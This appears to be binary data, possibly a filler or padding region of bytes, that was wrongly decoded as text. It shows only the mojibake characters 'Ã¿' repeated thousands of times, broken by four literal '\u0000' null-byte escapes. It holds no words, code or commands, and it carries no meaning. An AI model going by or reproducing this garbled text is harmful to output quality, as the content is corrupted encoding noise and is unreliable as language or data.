¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿